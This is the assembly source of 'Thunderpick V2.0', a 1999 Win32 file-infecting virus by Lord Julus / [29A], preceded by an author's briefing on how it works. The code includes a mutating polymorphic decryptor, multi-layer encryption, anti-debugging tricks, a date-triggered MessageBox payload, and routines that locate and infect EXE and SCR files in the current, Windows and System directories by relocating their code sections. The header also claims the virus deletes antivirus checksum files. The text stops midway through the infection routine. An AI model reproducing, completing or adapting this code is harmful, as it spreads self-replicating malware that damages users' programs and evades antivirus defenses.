 comment $

 ����������������������������������������������������������������������������

	Thunderpick is my newest baby. Let's see a briefing about it:

 ����������������������������������������������������������������������������

	Virus Name	  : Thunderpick V2.0
	Virus Author	  : Lord Julus / [29A]
	Virus Size	  : 7529 bytes
	Release Date	  : 1 Nov. 1999
	Target OS	  : Win32s, Windows 95/98, Windows NT, Windows 2000
	Target Files	  : PE Executbles (EXE, SCR)
	Type		  : Non-resident
	Append Method	  : Code section relocating and replacing
	Encrypted	  : Yes (multiple layers)
	Polymorphic	  : Yes (low-level polymorphism)
	Avoid AV files	  : Yes
	Kill AV files	  : Yes
	Payload Date	  : Day 07 of any month after hour 14:00
	Payload 	  : Graphical

 ����������������������������������������������������������������������������

	The  name  of  this virus is the name of one of the best bass solos I
 ever heard, sang by Joey DeMaio from Manowar and which appeared on the "Sign
 of the hammer" album. You should hear it!!

	As  being  a pure Win32 application this virus should have no problem
 in  working  under all actual Win32 environments. The anti-debugging feature
 contains   a call to the IsDebuggerPresent API which doesn't exist on Win95.
 However, to maintain the infection ability on this OS, the anti-debugging is
 avoided a little if the OS is Win95.

	What  is  unique  about this virus is it's appending method. What the
 virus does when infecting a clean victim is this:

	First the code section is located. If the virus length is bigger than
 the victim's code section, the infection process stops. If the virus can fit
 in  the  code	section  then  the  next  steps continue. The last section is
 increased with the virus size plus some additional space. Then, a part equal
 to  the  virus  size  is taken from the code section and copied into the new
 increased  space  in  the  last  section.  After that the relocating code is
 placed  after	it  as	the last piece of code there. All this amount of code
 (original  moved  code  plus  relocating code) get heavily encrypted with an
 algorithm  that  loops  about 500.000 times. Then the virus copied itself in
 the  original code section, over the place which was moved at the end. Then,
 the  entire virus body gets encrypted with two encryption layers. The deeper
 one  is another loooong algorithm (executes around 450.000 instructions) and
 the  above one is the polymorphic algorithm. Then all rearangements are made
 in  the  PE  header,  making  the  entrypoint to point the virus code (which
 resides  in the old code section). When the infected host executes the virus
 will  execute	first.	After  that,  the  control  will  be  passed  to  the
 relocating code which will copy the original code section back into it's old
 place	and make a jump to it. All registers and flags are preserved. In this
 way  the virus code can stay in the code section, making it's detection much
 harder.

	Please note that the place into the code section where the virus gets
 placed is random. Also, some random size is added at the end of file to make
 it even harder to remove.

	About  polymorphism,  this  virus  doesn't have a polymorphic engine.
 Instead the polymorphic decryptor is placed at the beginning of the code and
 it gets mutated at infection time.

	The  virus  avoids  to	infect	certain  anti-virus products and also
 attempts to delete all AV checksum files it can find.

	The  payload  triggers	on the 7th day of any month after 14:00 hour,
 when a MessageBox displays a some verses... ;-)

	Credits: Prizzy/29A (for the DR0 WinNT bug)

	$

;����������������������������������������������������������������������������
.486p						   ;�needed cpu
.model flat, stdcall				   ;�model
jumps						   ;�solve jumps
;����������������������������������������������������������������������������
TRUE  = 1					   ;�true value
FALSE = 0					   ;�false value
DEBUG = TRUE					   ;�debug status
GOAT  = TRUE					   ;�infect goat files?
;����������������������������������������������������������������������������
extrn ExitProcess      : proc			   ;�externals only required
extrn GetModuleHandleA : proc			   ;�only by the first
extrn GetProcAddress   : proc			   ;�generation
extrn MessageBoxA      : proc			   ;�
extrn CheckSumMappedFile:proc			   ;�
;����������������������������������������������������������������������������
.data						   ;�dummy data area
db 0						   ;�
include w32nt_lj.inc				   ;�equates and structures
;����������������������������������������������������������������������������
.code						   ;�virus code starts...
start:						   ;�...here
       pusha					   ;�save all registers
;mov eax, end-start				   ;�
poly_decryptor: 				   ;�
       jmp virusrun				   ;�this is where the poly
       db 1000d dup(0h) 			   ;�decryptor will be
poly_code_start:				   ;�
       jmp virusrun				   ;�need this!!!
;����������������������������������������������������������������������������
create_poly:					   ;�The poly generator stars
; EDI = address of code to encrypt		   ;�here...
; ESI = address to place decryptor to		   ;�
; ECX = length of code to encrypt		   ;�
; EBX = address of code to decrypt at runtime	   ;�
       pusha					   ;�save data
       mov [ebp+address1], edi			   ;�
       mov [ebp+address2], esi			   ;�
       mov [ebp+length], ecx			   ;�
       mov dword ptr [ebp+@100+1], ebx		   ;�fill in code address
       mov eax, 0FFFFFFFEh			   ;�
       call brandom32				   ;�
       mov dword ptr [ebp+@101+1], eax		   ;�fill in key
       mov [ebp+polykey], eax			   ;�
       mov dword ptr [ebp+@102+1], ecx		   ;�
       mov eax, 0FFFFFFFEh			   ;�
       call brandom32				   ;�
       mov dword ptr [ebp+@104+2], eax		   ;�fill in value
       mov [ebp+value], eax			   ;�
       mov eax, 0FFFFFFFEh			   ;�
       call brandom32				   ;�
       mov dword ptr [ebp+@106+2], eax		   ;�fill in key modifier
       mov [ebp+keymodif], eax			   ;�
       mov ecx, 100h				   ;�
mangle_loop:					   ;�choose random registers
       lea ebx, [ebp+regs]			   ;�
       lea edx, [ebp+regs]			   ;�
       mov eax, 6				   ;�
       call brandom32				   ;�
       add ebx, eax				   ;�
       mov eax, 6				   ;�
       call brandom32				   ;�
       add edx, eax				   ;�
       mov al, byte ptr [edx]			   ;�
       xchg al, byte ptr [ebx]			   ;�
       mov byte ptr [edx], al			   ;�
       loop mangle_loop 			   ;�
       mov al, [ebp+preg]			   ;�fill pointer reg
       and byte ptr [ebp+@100], 11111000b	   ;�
       or byte ptr [ebp+@100], al		   ;�
						   ;�
       and byte ptr [ebp+@500+1], 11111000b	   ;�
       or byte ptr [ebp+@500+1], al		   ;�
						   ;�
       mov al, [ebp+kreg]			   ;�fill key reg
       and byte ptr [ebp+@101], 11111000b	   ;�
       or byte ptr [ebp+@101], al		   ;�
       and byte ptr [ebp+@106+1], 11111000b	   ;�
       or byte ptr [ebp+@106+1], al		   ;�
       mov al, [ebp+lreg]			   ;�fill length reg
       and byte ptr [ebp+@102], 11111000b	   ;�
       or byte ptr [ebp+@102], al		   ;�
       mov al, [ebp+creg]			   ;�fill code reg
       and byte ptr [ebp+@104+1], 11111000b	   ;�
       or byte ptr [ebp+@104+1], al		   ;�
       mov al, [ebp+creg]			   ;�and others...;-/
       shl al, 3				   ;�
       or al, [ebp+kreg]			   ;�
       and byte ptr [ebp+@105+1], 11000000b	   ;�
       or byte ptr [ebp+@105+1], al		   ;�
       mov al, [ebp+creg]			   ;�
       shl al, 3				   ;�
       or al, [ebp+preg]			   ;�
       and byte ptr [ebp+@103+1], 11000000b	   ;�
       or byte ptr [ebp+@103+1], al		   ;�
       and byte ptr [ebp+@107+1], 11000000b	   ;�
       or byte ptr [ebp+@107+1], al		   ;�
       mov al, [ebp+preg]			   ;�
       and byte ptr [ebp+@108+1], 11111000b	   ;�
       or byte ptr [ebp+@108+1], al		   ;�
       mov al, [ebp+lreg]			   ;�
       and byte ptr [ebp+@109], 11111000b	   ;�
       or byte ptr [ebp+@109], al		   ;�
       lea edi, [ebp+op1]			   ;�choose randomly the
       mov eax, 2				   ;�three operations
       call brandom32				   ;�
       mov [ebp+index1], eax			   ;�
       add edi, eax				   ;�
       mov al, byte ptr [edi]			   ;�
       mov byte ptr [ebp+@105], al		   ;�
						   ;�
       lea edi, [ebp+op2]			   ;�
       mov eax, 2				   ;�
       call brandom32				   ;�
       mov [ebp+index2], eax			   ;�
       add edi, eax				   ;�
       mov al, byte ptr [edi]			   ;�
       and byte ptr [ebp+@104+1], 00000111b	   ;�
       or byte ptr [ebp+@104+1], al		   ;�
						   ;�
       lea edi, [ebp+op2]			   ;�
       mov eax, 2				   ;�
       call brandom32				   ;�
       mov [ebp+index3], eax			   ;�
       add edi, eax				   ;�
       mov al, byte ptr [edi]			   ;�
       and byte ptr [ebp+@106+1], 00000111b	   ;�
       or byte ptr [ebp+@106+1], al		   ;�
						   ;�
       lea esi, [ebp+@100]			   ;�now move the instruct.
       mov edi, [ebp+address2]			   ;�and generate junk...
       lea ebx, [ebp+instr_len] 		   ;�
       mov eax, 1				   ;�
       call makejunk				   ;�
move_decryptor: 				   ;�
       mov ecx, [ebx]				   ;�get instruction length
       jcxz done_move				   ;�
       rep movsb				   ;�move it!
       add ebx, 4				   ;�
       inc eax					   ;�
       cmp eax, 4				   ;�
       jne no_case				   ;�
       mov [ebp+save], edi			   ;�
no_case:					   ;�
       cmp eax, 11d				   ;�
       je no_junk				   ;�
       call makejunk				   ;�do junk!
no_junk:					   ;�
       jmp move_decryptor			   ;�
						   ;�
done_move:					   ;�
       mov eax, edi				   ;�
       sub eax, dword ptr [ebp+save]		   ;�
       neg eax					   ;�
       mov dword ptr [edi-4], eax		   ;�
						   ;�
       mov eax, [ebp+address2]			   ;�fill in the jump to
       sub eax, edi				   ;�virus body
       neg eax					   ;�
       mov ebx, poly_code_start-poly_decryptor	   ;�
       sub ebx, eax				   ;�
       mov edx, dword ptr [ebp+poly_code_start+1]  ;�
       add edx, ebx				   ;�
       mov al, 0E9h				   ;�
       stosb					   ;�
       mov eax, edx				   ;�
       stosd					   ;�
						   ;�
       mov eax, [ebp+value]			   ;�now prepare the
       mov dword ptr [ebp+@200+2], eax		   ;�encryptor to make the
       mov eax, [ebp+keymodif]			   ;�encryption of the code
       mov dword ptr [ebp+@202+2], eax		   ;�
						   ;�
       lea edi, [ebp+unop1]			   ;�
       add edi, [ebp+index1]			   ;�
       mov al, byte ptr [edi]			   ;�
       mov byte ptr [ebp+@201], al		   ;�
						   ;�
       lea edi, [ebp+unop2]			   ;�
       add edi, [ebp+index2]			   ;�
       mov al, byte ptr [edi]			   ;�
       and byte ptr [ebp+@200+1], 00000111b	   ;�
       or byte ptr [ebp+@200+1], al		   ;�
						   ;�
       lea edi, [ebp+op2]			   ;�
       add edi, [ebp+index3]			   ;�
       mov al, byte ptr [edi]			   ;�
       and byte ptr [ebp+@202+1], 00000111b	   ;�
       or byte ptr [ebp+@202+1], al		   ;�
						   ;�
       mov edi, [ebp+address1]			   ;�
       mov ebx, [ebp+polykey]			   ;�
       mov ecx, [ebp+length]			   ;�
						   ;�
encrypt_poly:					   ;�encrypt the code!
       mov edx, [edi]				   ;�
@201:  add edx, ebx				   ;�
@200:  add edx, 12345678h			   ;�
@202:  add ebx, 12345678h			   ;�
       mov [edi], edx				   ;�
       add edi, 4				   ;�
       dec ecx					   ;�
       jnz encrypt_poly 			   ;�
       popa					   ;�
       ret					   ;�
						   ;�
makejunk:					   ;�here we make some
       push eax ebx				   ;�random amount of junk
       mov al, 0E9h				   ;�
       stosb					   ;�
       xor eax, eax				   ;�
       stosd					   ;�
       mov ebx, edi				   ;�
       mov eax, 30				   ;�
       call brandom32				   ;�
       inc eax					   ;�
       mov ecx, eax				   ;�
						   ;�
junk_loop:					   ;�
       mov eax, 0FFFFFFFEh			   ;�
       call brandom32				   ;�
       stosd					   ;�
       loop junk_loop				   ;�
						   ;�
       mov eax, edi				   ;�
       sub eax, ebx				   ;�
       mov dword ptr [ebx-4], eax		   ;�
       pop ebx eax				   ;�
       ret					   ;�
@100:  mov ebx, 12345678h			   ;�store code offset
@500:  add ebx, 12345678h			   ;�
@101:  mov ebx, 12345678h			   ;�store key
@102:  mov ebx, 12345678h			   ;�store length
@103:  mov ebx, [ebx]				   ;�get a dword
@104:  add ebx, 12345678h			   ;�decrypt with value
@105:  add ebx, ebx				   ;�decrypt with key
@106:  add ebx, 12345678h			   ;�modify key
@107:  mov [ebx], ebx				   ;�store dword
@108:  add ebx, 4				   ;�increase pointer
@109:  dec ebx					   ;�decrease length
       jz @10A					   ;�until the end
       db 0E9h					   ;�
       dd 0					   ;�
@10A:						   ;�
polykey  dd 0					   ;�
value	 dd 0					   ;�
keymodif dd 0					   ;�
length	 dd 0					   ;�
address1 dd 0					   ;�
address2 dd 0					   ;�
save	 dd 0					   ;�
finito	 dd 0					   ;�
regs:						   ;�
creg  db 0					   ;� code
lreg  db 1					   ;� length of code
kreg  db 2					   ;� encryption key
preg  db 3					   ;� pointer in code
jreg2 db 6					   ;� Junk register #1
jreg3 db 7					   ;� Junk register #2
						   ;�
op1   db 33h, 2Bh, 03h				   ;�
unop1 db 33h, 03h, 2Bh				   ;�
						   ;�
op2   db 11110000b, 11101000b, 11000000b	   ;�
unop2 db 11110000b, 11000000b, 11101000b	   ;�
						   ;�
index1 dd 0					   ;�
index2 dd 0					   ;�
index3 dd 0					   ;�
						   ;�
instr_len dd @101-@100, @102-@101, @103-@102	   ;�
	  dd @104-@103, @105-@104, @106-@105	   ;�
	  dd @107-@106, @108-@107, @109-@108	   ;�
	  dd @10A-@109, 0			   ;�
;����������������������������������������������������������������������������
virusrun:					   ;�
       call getdelta				   ;�get delta handle
						   ;�
getdelta:					   ;�
       pop ebp					   ;�
       sub ebp, offset getdelta 		   ;�
       call @13 				   ;�now obtain the imagebase
@13:   pop eax					   ;�where the host loaded
@12:   sub eax, 00001000h+(@12-start)-1 	   ;�
       mov dword ptr [ebp+imagebase], eax	   ;�and save it...
       jmp done 				   ;�
       imagebase dd 00400000h			   ;�default imagebase
;����������������������������������������������������������������������������
done:						   ;�
       cmp [ebp+first_gen], 0			   ;�don't decrypt for
       je decrypt_level_2			   ;�gen. 1
						   ;�
       mov ecx, 100h				   ;�
						   ;�
decrypt_iteration:				   ;�
       mov edx, 'DEAD'+'MEAT'			   ;�initialize decryptor
       lea edi, [ebp+decrypt_level_2]		   ;�
       mov esi, edi				   ;�
       mov ebx, (end-decrypt_level_2)/4 	   ;�
						   ;�
decrypt_routine:				   ;�
       lodsd					   ;�do decryption.
       ror eax, 16				   ;�This decryptor loops
       xor eax, 'LORD'+'JULU'+'S'		   ;�about 310.000 times
       rol eax, 16				   ;�and executes thou
       add eax, 'THUN'+'DERP'+'ICK'		   ;�around 4.650.000
       sub eax, edx				   ;�instructions.
       add edx, 'KICK'+'ASS!'			   ;�
       stosd					   ;�
       dec ebx					   ;�
       jnz decrypt_routine			   ;�
       loop decrypt_iteration			   ;�
       mov [ebp+delta], ebp			   ;�save delta for later
;����������������������������������������������������������������������������
decrypt_level_2:				   ;�
       IF DEBUG 				   ;�if debug is off we
       ELSE					   ;�also need to restore
       mov [ebp+delta2], ebp			   ;�this...
       ENDIF					   ;�
;����������������������������������������������������������������������������
       jmp FindNeededStuff			   ;�get module bases and
first_gen db 0					   ;�api addresses.
db " ThunderPick V2.0 Release November 1999 "	   ;�
db " by Lord Julus / [29A]		    "	   ;�
FinishedLocatingStuff:				   ;�if successful...
;����������������������������������������������������������������������������
Anti_Debugging: 				   ;�
       IF DEBUG 				   ;�if this is the release
       ELSE					   ;�version, we must do the
       lea eax, [ebp+DebuggerKill]		   ;�antidebugging stuffs.
       push eax 				   ;�Here we set up a new
       xor ebx, ebx				   ;�seh frame and then we
       push dword ptr fs:[ebx]			   ;�make an exception error
       mov fs:[ebx], esp			   ;�occur.
       dec dword ptr [ebx]			   ;�TD stops here if in
						   ;�default mode.
       push 0					   ;�if instruction is not
       jmp Anti_Debugging			   ;�executed the system will
						   ;�halt...
DebuggerKill:					   ;�
       mov esp, [esp+8] 			   ;�the execution goes here
       pop dword ptr fs:[0]			   ;�
       add esp, 4				   ;�
						   ;�
       db 0BDh					   ;�delta gets lost so we
delta2 dd 0					   ;�must restore it...
						   ;�
       call @6					   ;�here we try to retrieve
       db 'IsDebuggerPresent', 0		   ;�IsDebuggerPresent API
@6:    push [ebp+k32]				   ;�if we fail it means we
       call [ebp+_GetProcAddress]		   ;�don't have this api
       or eax, eax				   ;�(Windows95)
       jz continue_process			   ;�
						   ;�
       call eax 				   ;�Let's check if our
       or eax, eax				   ;�process is being
       jne shut_down				   ;�debugged.
       jmp continue_process			   ;�
						   ;�
       shut_down:				   ;�
       push 0					   ;�If so, close down!!
       call [ebp+_ExitProcess]			   ;�close
       ENDIF					   ;�
continue_process:				   ;�
;����������������������������������������������������������������������������
       cmp [ebp+first_gen], 0			   ;�a little trick to
       jne ok_					   ;�ensure the right run
       mov [ebp+gen1], 1			   ;�of the first gen.
       jmp ok__ 				   ;�
						   ;�
ok_:						   ;�
       mov [ebp+gen1], 0			   ;�
						   ;�
ok__:						   ;�
       call Randomize				   ;�initialize random gen.
       call Decrypt				   ;�decrypt stuff
       call Payload				   ;�try the payload
       call Infect				   ;�infect files
       call KillAV				   ;�kill av files
       jmp ReturnToHost 			   ;�and return to host
;����������������������������������������������������������������������������
Decrypt:					   ;�
       cmp [ebp+first_gen], 0			   ;�let's decrypt the orig.
       jne do_it				   ;�code and the relocating
       ret					   ;�code.
						   ;�
do_it:						   ;�
       pusha					   ;�save regs
       lea ebx, [ebp+key]			   ;�
       mov eax, dword ptr [ebx] 		   ;�get key
       mov esi, dword ptr [ebp+increment]	   ;�get key increment
@10:   mov edi, 12345678h			   ;�address of code
       add edi, [ebp+imagebase] 		   ;�
       mov ecx, incrsize/4			   ;�size of code
       mov ebx, dword ptr [ebp+iterations]	   ;�number of iterations
       push edi 				   ;�save edi
						   ;�
decrypt_loop:					   ;�
       mov edx, [edi]				   ;�get dword
       add edx, eax				   ;�increment with key
       sub eax, esi				   ;�increment key
       xor edx, esi				   ;�xor with increment
       ror edx, 1				   ;�rotate
       mov [edi], edx				   ;�and store
       add edi, 4				   ;�go to next dword
       loop decrypt_loop			   ;�loop until end
       dec ebx					   ;�decrement iterations
       jz ready 				   ;�
       lea ecx, [ebp+key]			   ;�
       mov eax, [ecx]				   ;�
       mov ecx, incrsize/4			   ;�redo all...
       pop edi					   ;�
       push edi 				   ;�
       jmp decrypt_loop 			   ;�
						   ;�
ready:						   ;�
       pop edi					   ;�
       popa					   ;�
       ret					   ;�
;����������������������������������������������������������������������������
Payload:					   ;�
       pusha					   ;�
       call @30 				   ;�
time   SYSTEMTIME <0>				   ;�
@30:   call [ebp+_GetSystemTime]		   ;�
						   ;�
       lea edi, [ebp+time]			   ;�
       cmp dword ptr [edi.ST_wDay], 7		   ;�
       jne nopayload				   ;�
       cmp dword ptr [edi.ST_wHour], 14d	   ;�
       jbe nopayload				   ;�
						   ;�
       push 1000h				   ;�
       call @31 				   ;�
       db 'Win32.ThunderPick / [29A]',0 	   ;�
@31:   call @32 				   ;�������������������������
       db 10,13,'	It''s  time  for  the  Thunder...	  ',10,13  ;�
       db	'	It''s  time  for  the  Pick...		  ',10,13  ;�
       db	'	And it''s  time  for  the  Rocker	  ', 10,13 ;�
       db	'	Your  bottom  to  kick !!!		  ',10,13,0;�
@32:   push 0					   ;�������������������������
       call [ebp+_MessageBoxA]			   ;�
						   ;�
nopayload:					   ;�
       popa					   ;�
       ret					   ;�
;����������������������������������������������������������������������������
Infect: 					   ;�
       mov [ebp+first_gen], 1			   ;�mark the first gen.
       push 0					   ;�Get the drive type. If
       call [ebp+_GetDriveTypeA]		   ;�it is a fixed drive
       sub [ebp+crt_dir_flag], eax		   ;�than this value = 0
						   ;�
       push 260 				   ;�Get Windows directory
       call @1					   ;�
windir db 260 dup(0)				   ;�
@1:    call [ebp+_GetWindowsDirectoryA] 	   ;�
						   ;�
       push 260 				   ;�Get System directory
       call @2					   ;�
sysdir db 260 dup(0)				   ;�
@2:    call [ebp+_GetSystemDirectoryA]		   ;�
						   ;�
       call @3					   ;�Get current directory
crtdir db 260 dup(0)				   ;�
@3:    push 260 				   ;�
       call [ebp+_GetCurrentDirectoryA] 	   ;�
						   ;�
       cmp dword ptr [ebp+crt_dir_flag], 0	   ;�are we on a fixed disk?
       jne direct_to_windows			   ;�
						   ;�
       mov dword ptr [ebp+infections], 0FFFFh	   ;�infect all files there
       call Infect_Directory			   ;�
						   ;�
direct_to_windows:				   ;�
       cmp [ebp+gen1], 1			   ;�first generation?
       je back_to_current_dir			   ;�
       lea eax, [ebp+offset windir]		   ;�Change to Windows dir.
       push eax 				   ;�
       call [ebp+_SetCurrentDirectoryA] 	   ;�
						   ;�
       mov dword ptr [ebp+infections], 3	   ;�infect 3 files there
       call Infect_Directory			   ;�
						   ;�
       lea eax, [ebp+offset sysdir]		   ;�Change to System dir.
       push eax 				   ;�
       call [ebp+_SetCurrentDirectoryA] 	   ;�
						   ;�
       mov dword ptr [ebp+infections], 3	   ;�infect 3 files there
       call Infect_Directory			   ;�
						   ;�
back_to_current_dir:				   ;�
       lea eax, [ebp+offset crtdir]		   ;�Change back to crt dir.
       push eax 				   ;�
       call [ebp+_SetCurrentDirectoryA] 	   ;�
       ret					   ;�
infections   dd 0				   ;�
crt_dir_flag dd 3				   ;�
;����������������������������������������������������������������������������
Infect_Directory:				   ;�
       mov [ebp+crt_dir_flag], 3		   ;�reset this
       xor esi, esi				   ;�
						   ;�
re_do:						   ;�
       call @4					   ;�locate first matching
       finddata WIN32_FIND_DATA <?>		   ;�file.
@4:    or esi, esi				   ;�
       jnz next_mask				   ;�
       call @5					   ;�
       IF GOAT					   ;�
       filemask1 db 'goat*.exe',0		   ;�
       ELSE					   ;�
       filemask1 db '*.EXE',0			   ;�
       ENDIF					   ;�
						   ;�
next_mask:					   ;�
       call @5					   ;�
       IF GOAT					   ;�
       filemask2 db 'goat*.scr', 0		   ;�
       ELSE					   ;�
       filemask2 db '*.SCR', 0			   ;�
       ENDIF					   ;�
@5:    call [ebp+_FindFirstFileA]		   ;�
       mov [ebp+findhandle], eax		   ;�
						   ;�
compare:					   ;�
       call CheckError				   ;�
       jc get_next				   ;�
						   ;�
       lea edi, [ebp+finddata.WFD_cFileName]	   ;�get name
       call Infect_File 			   ;�and infect it
       jc no_infection				   ;�
       dec [ebp+infections]			   ;�
       jz finished_infection			   ;�
						   ;�
no_infection:					   ;�
       lea ebx, [ebp+finddata]			   ;�locate next matching
       push ebx 				   ;�name.
       push [ebp+findhandle]			   ;�
       call [ebp+_FindNextFileA]		   ;�
       jmp compare				   ;�
						   ;�
get_next:					   ;�
       cmp esi, extensions			   ;�
       je finished_infection			   ;�
       inc esi					   ;�
       jmp re_do				   ;�
						   ;�
finished_infection:				   ;�
       push [ebp+findhandle]			   ;�
       call [ebp+_FindClose]			   ;�
       ret					   ;�
extensions equ 1				   ;�
findhandle dd 0 				   ;�
;����������������������������������������������������������������������������
Infect_File:					   ;�
       pusha					   ;�save regs
						   ;�
       mov [ebp+flag], 0			   ;�
						   ;�
       push edi 				   ;�
       call ValidateName			   ;�validate the file
       jc quit_infection			   ;�name (e.g. no AV)
						   ;�
       push edi 				   ;�
       call [ebp+_GetFileAttributesA]		   ;�save file's attributes
       mov [ebp+fileattributes], eax		   ;�
						   ;�
       push 80h 				   ;�
       push edi 				   ;�
       call [ebp+_SetFileAttributes]		   ;�set attributes to norm.
						   ;�
       push 0					   ;�open the file!
       push FILE_ATTRIBUTE_NORMAL		   ;�
       push OPEN_EXISTING			   ;�
       push 0					   ;�
       push FILE_SHARE_READ + FILE_SHARE_WRITE	   ;�
       push GENERIC_READ + GENERIC_WRITE	   ;�
       push edi 				   ;�
       call [ebp+_CreateFileA]			   ;�
						   ;�
       call CheckError				   ;�
       jc quit_infection			   ;�
						   ;�
       mov [ebp+filehandle], eax		   ;�save handle
						   ;�
       lea ebx, [ebp+filetime]			   ;�save the file time
       push ebx 				   ;�
       add ebx, 8				   ;�
       push ebx 				   ;�
       add ebx, 8				   ;�
       push ebx 				   ;�
       push eax 				   ;�
       call [ebp+_GetFileTime]			   ;�
						   ;�
       push 0					   ;�get the file size
       push [ebp+filehandle]			   ;�
       call [ebp+_GetFileSize]			   ;�
						   ;�
       call CheckError				   ;�
       jc close_file				   ;�
						   ;�
       mov [ebp+filesize], eax			   ;�calculate the memory
       add eax, incrsize			   ;�size
       mov [ebp+memsize], eax			   ;�
						   ;�
       push 0					   ;�create a file mapping
       push [ebp+memsize]			   ;�object
       push 0					   ;�
       push PAGE_READWRITE			   ;�
       push 0					   ;�
       push [ebp+filehandle]			   ;�
       call [ebp+_CreateFileMappingA]		   ;�
						   ;�
       call CheckError				   ;�
       jc close_file				   ;�
						   ;�
       mov [ebp+maphandle], eax 		   ;�save the map handle
						   ;�
       push [ebp+memsize]			   ;�map the file!
       push 0					   ;�
       push 0					   ;�
       push FILE_MAP_ALL_ACCESS 		   ;�
       push eax 				   ;�
       call [ebp+_MapViewOfFile]		   ;�
						   ;�
       call CheckError				   ;�
       jc close_map				   ;�
						   ;�
       mov [ebp+mapaddress], eax		   ;�save the map address
						   ;�
       mov esi, eax				   ;�
						   ;�
       cmp word ptr [esi], 'ZM' 		   ;�Dos signature
       jne unmap_view				   ;�
       mov esi, dword ptr [esi.MZ_lfanew]	   ;�get PEheader offset
       add esi, [ebp+mapaddress]		   ;�
						   ;�
       push 200h				   ;�can we read?
       push esi 				   ;�
       call [ebp+_IsBadReadPtr] 		   ;�
       or eax, eax				   ;�
       jnz close_map				   ;�
						   ;�
       cmp word ptr [esi], 'EP' 		   ;�PE file?
       jne unmap_view				   ;�
						   ;�
       lea edi, [ebp+data_area] 		   ;�our data area
						   ;�
       mov eax, esi				   ;�now get and save
       stosd					   ;�all the needed data from
       mov ax, [esi.NumberOfSections]		   ;�the PE headers
       stosw					   ;�
       mov ax, [esi.SizeOfOptionalHeader]	   ;�
       stosw					   ;�
						   ;�
       add esi, IMAGE_FILE_HEADER_SIZE		   ;�
						   ;�
       mov ax, [esi.OH_MajorImageVersion]	   ;�already infected?
       cmp ax, 'TH'				   ;�
       je close_map				   ;�
						   ;�
       mov [esi.OH_MajorImageVersion], 'TH'	   ;�
						   ;�
       mov eax, esi				   ;�
       stosd					   ;�
       mov eax, [esi.OH_SizeOfCode]		   ;�
       stosd					   ;�
       mov eax, [esi.OH_ImageBase]		   ;�
       stosd					   ;�
       mov eax, [esi.OH_FileAlignment]		   ;�
       stosd					   ;�
       mov eax, [esi.OH_SectionAlignment]	   ;�
       stosd					   ;�
       mov eax, [esi.OH_AddressOfEntryPoint]	   ;�
       stosd					   ;�
       mov eax, [esi.OH_BaseOfCode]		   ;�
       stosd					   ;�
       mov eax, [esi.OH_SizeOfImage]		   ;�
       stosd					   ;�
       jmp overdata				   ;�
						   ;�
data_area:					   ;�usefull data...
       peheader 	    dd 0		   ;�
       numberofsections     dw 0		   ;�
       sizeofoptionalheader dw 0		   ;�
       optionalheader	    dd 0		   ;�
       sizeofcode	    dd 0		   ;�
       image_base	    dd 0		   ;�
       filealign	    dd 0		   ;�
       sectionalign	    dd 0		   ;�
       eip		    dd 0		   ;�
       baseofcode	    dd 0		   ;�
       sizeofimage	    dd 0		   ;�
       firstsection	    dd 0		   ;�
       codesection	    dd 0		   ;�
       lastsection	    dd 0		   ;�
       randomincr	    dd 0		   ;�
overdata:					   ;�
       cmp [ebp+sizeofcode], virussize		   ;�our virus can fit the
       jb unmap_view				   ;�code section?
						   ;�
       mov eax, [ebp+image_base]		   ;�
       mov dword ptr [ebp+@500+2], eax		   ;�
						   ;�
       add si, word ptr [ebp+sizeofoptionalheader] ;�
       mov eax, esi				   ;�
       stosd					   ;�
       xor ebx, ebx				   ;�
						   ;�
locate_code_section:				   ;�let's locate the code
       mov eax, [esi.SH_VirtualAddress] 	   ;�section...
       cmp eax, [ebp+baseofcode]		   ;�
       je found_it				   ;�
       add esi, IMAGE_SIZEOF_SECTION_HEADER	   ;�
       inc bx					   ;�
       cmp bx, [ebp+numberofsections]		   ;�
       jae unmap_view				   ;�
       jmp locate_code_section			   ;�
						   ;�
found_it:					   ;�
       mov eax, esi				   ;�found!
       stosd					   ;�
						   ;�
       xor eax, eax				   ;�let's locate the
       mov ax, [ebp+numberofsections]		   ;�last section's header
       mov ecx, IMAGE_SIZEOF_SECTION_HEADER	   ;�
       dec eax					   ;�
       xor edx, edx				   ;�
       mul ecx					   ;�
       mov esi, [ebp+firstsection]		   ;�
       add esi, eax				   ;�
       mov eax, esi				   ;�
       stosd					   ;�
						   ;�
       mov eax, [ebp+sizeofcode]		   ;�get a random offset from
       sub eax, virussize+10h			   ;�the start to put the
       call brandom32				   ;�code there...
       mov [ebp+randomincr], eax		   ;�
						   ;�
       mov ebx, [ebp+codesection]		   ;�go to code section's
       mov esi, [ebx.SH_PointerToRawData]	   ;�raw data
       add esi, [ebp+randomincr]		   ;�
						   ;�save the address
       mov ebx, [ebp+lastsection]		   ;�go to the last section
       mov edi, [ebx.SH_PointerToRawData]	   ;�at it's end...
       add edi, [ebx.SH_VirtualSize]		   ;�
						   ;�...and save that
       add edi, [ebp+mapaddress]		   ;�normalize...
       add esi, [ebp+mapaddress]		   ;�
       mov ecx, virussize			   ;�bytes to transfer
       rep movsb				   ;�move the code...
						   ;�
       mov eax, [ebx.SH_VirtualAddress] 	   ;�and also fill in the
       add eax, [ebx.SH_VirtualSize]		   ;�address for the reloc.
       mov dword ptr [ebp+@7+1], eax		   ;�code
						   ;�
       mov dword ptr [ebp+@10+1], eax		   ;�and for the decryptor
       add eax, virussize			   ;�
       mov [ebp+jumper], eax			   ;�save this value
						   ;�
       mov esi, [ebp+codesection]		   ;�fill more...
       mov eax, [esi.SH_VirtualAddress] 	   ;�
       add eax, [ebp+randomincr]		   ;�
       mov dword ptr [ebp+@8+1], eax		   ;�
						   ;�
       mov eax, [ebp+eip]			   ;�fill the jump
       mov dword ptr [ebp+@9+1], eax		   ;�
						   ;�
       lea esi, [ebp+relocating_code]		   ;�now move also the
       mov ecx, relo_code_size			   ;�relocating code
       rep movsb				   ;�
						   ;�
       pusha					   ;�now let's encrypt the
       mov edi, [ebx.SH_PointerToRawData]	   ;�original code plus the
       add edi, [ebx.SH_VirtualSize]		   ;�relocating code which
       add edi, [ebp+mapaddress]		   ;�are now at the end of
       mov eax, 0FFFFFFFEh			   ;�the last section. The
       call brandom32				   ;�encryption is multi-
       mov dword ptr [ebp+key], eax		   ;�iterative with sliding
       mov eax, 0FFFFFFFEh			   ;�key, fixed key, fixed
       call brandom32				   ;�operation. Max 100h
       mov dword ptr [ebp+increment], eax	   ;�iterations multiplied
       mov eax, 50h				   ;�by around 500h gives
       call brandom32				   ;�the total number of
       add eax, 50h				   ;�loops.
       mov eax, 1				   ;�
       mov [ebp+iterations], eax		   ;�
						   ;�
       mov eax, [ebp+key]			   ;�get key
